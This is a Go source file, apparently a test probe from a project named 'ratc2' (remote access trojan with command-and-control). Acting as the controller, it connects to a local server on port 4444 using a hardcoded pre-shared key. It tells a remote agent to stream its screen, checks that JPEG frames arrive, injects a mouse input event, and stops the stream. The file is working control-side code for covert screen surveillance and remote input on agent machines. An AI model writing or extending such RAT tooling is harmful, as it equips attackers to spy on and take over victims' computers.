// ctl_stream_probe — 屏幕流端到端探针：模拟 ctl 发起屏幕流并验证帧到达
// 用法：ctl_stream_probe <agent_id_hex> [帧数] [秒]
package main

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"strconv"
	"time"

	"ratc2/internal/protocol"
)

const pskHex = "0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20"

func main() {
	if len(os.Args) < 2 {
		fmt.Println("usage: ctl_stream_probe <agent_id_hex> [want_frames] [timeout_s]")
		os.Exit(2)
	}
	agentIDHex := os.Args[1]
	wantFrames := 3
	timeoutS := 15
	if len(os.Args) > 2 {
		wantFrames, _ = strconv.Atoi(os.Args[2])
	}
	if len(os.Args) > 3 {
		timeoutS, _ = strconv.Atoi(os.Args[3])
	}

	psk, _ := hex.DecodeString(pskHex)
	conn, err := net.Dial("tcp", "127.0.0.1:4444")
	if err != nil {
		fmt.Println("connect:", err)
		os.Exit(1)
	}
	defer conn.Close()

	// 握手（CONTROL）
	clientNonce := make([]byte, 16)
	rand.Read(clientNonce)
	hello := make([]byte, 0, 4+1+16+16)
	hello = binary.LittleEndian.AppendUint32(hello, 1<<16|1)
	hello = append(hello, protocol.RoleControl)
	hello = append(hello, make([]byte, 16)...)
	hello = append(hello, clientNonce...)
	protocol.WritePacket(conn, &protocol.Header{Cmd: protocol.CmdHello}, hello)
	h, raw, _ := protocol.ReadPacket(conn)
	if h.Cmd != protocol.CmdHelloAck {
		fmt.Println("handshake failed")
		os.Exit(1)
	}
	key := protocol.DeriveSessionKey(psk, clientNonce, raw[1:17])
	fmt.Println("[probe] connected, key derived")

	agentID, _ := hex.DecodeString(agentIDHex)
	seq := uint32(0)
	send := func(cmd uint16, payload []byte) error {
		seq++
		enc, _ := protocol.EncryptPayload(key, payload)
		return protocol.WritePacket(conn, &protocol.Header{
			Flags: protocol.FlagEncrypted, Seq: seq, Cmd: cmd, Plugin: protocol.PluginSys,
		}, enc)
	}

	// 可选 scale 百分比（argv[4]，默认 100）
	scalePct := byte(100)
	if len(os.Args) > 4 {
		if v, err := strconv.Atoi(os.Args[4]); err == nil && v > 0 && v <= 100 {
			scalePct = byte(v)
		}
	}
	// 1) 发起屏幕流（start）：agent_id + control + fps + quality + scale%
	stream := append(append([]byte{}, agentID...), 1, 10, 70, scalePct)
	if err := send(protocol.CmdScreenStream, stream); err != nil {
		fmt.Println("send stream cmd:", err)
		os.Exit(1)
	}
	fmt.Println("[probe] screen stream start requested")

	// 2) 等帧
	frames := 0
	jpegOK := true
	deadline := time.Now().Add(time.Duration(timeoutS) * time.Second)
	conn.SetReadDeadline(deadline)
	for frames < wantFrames && time.Now().Before(deadline) {
		h, raw, err := protocol.ReadPacket(conn)
		if err != nil {
			fmt.Println("read:", err)
			break
		}
		body, err := protocol.DecryptPayload(key, raw)
		if err != nil {
			continue
		}
		if h.Cmd == protocol.CmdScreenFrame && len(body) >= 12 {
			fseq := binary.LittleEndian.Uint32(body[0:])
			w := int(body[4]) | int(body[5])<<8
			hh := int(body[6]) | int(body[7])<<8
			jl := binary.LittleEndian.Uint32(body[8:])
			if len(body) >= 12+int(jl) && jl > 2 && body[12] == 0xFF && body[13] == 0xD8 {
				frames++
				fmt.Printf("[probe] frame#%d seq=%d %dx%d jpeg=%d bytes (JPEG header OK)\n",
					frames, fseq, w, hh, jl)
			} else {
				jpegOK = false
			}
		} else if h.Cmd == protocol.CmdResult && len(body) >= 5 {
			fmt.Printf("[probe] CMD_RESULT status=%d: %s\n", body[4], string(body[5:]))
		}
	}
	fmt.Printf("[probe] frames=%d/%d jpegOK=%v\n", frames, wantFrames, jpegOK)

	// 3) 发一个输入事件（WM_MOUSEMOVE）
	ev := make([]byte, 4+24)
	binary.LittleEndian.PutUint32(ev[0:], 1)
	binary.LittleEndian.PutUint32(ev[4:], 0x200)  // msg
	binary.LittleEndian.PutUint32(ev[8:], 0)      // vk
	binary.LittleEndian.PutUint32(ev[16:], 100)   // x
	binary.LittleEndian.PutUint32(ev[20:], 200)   // y
	eventPayload := append(append([]byte{}, agentID...), ev...)
	if err := send(protocol.CmdInputEvents, eventPayload); err != nil {
		fmt.Println("send input:", err)
	}
	fmt.Println("[probe] input event sent")

	// 4) 停止
	stop := append(append([]byte{}, agentID...), 0, 0, 0)
	send(protocol.CmdScreenStream, stop)
	fmt.Println("[probe] stream stop requested")

	time.Sleep(2 * time.Second)
	if frames >= wantFrames && jpegOK {
		fmt.Println("RESULT: PASS")
		os.Exit(0)
	}
	fmt.Println("RESULT: FAIL")
	os.Exit(1)
}
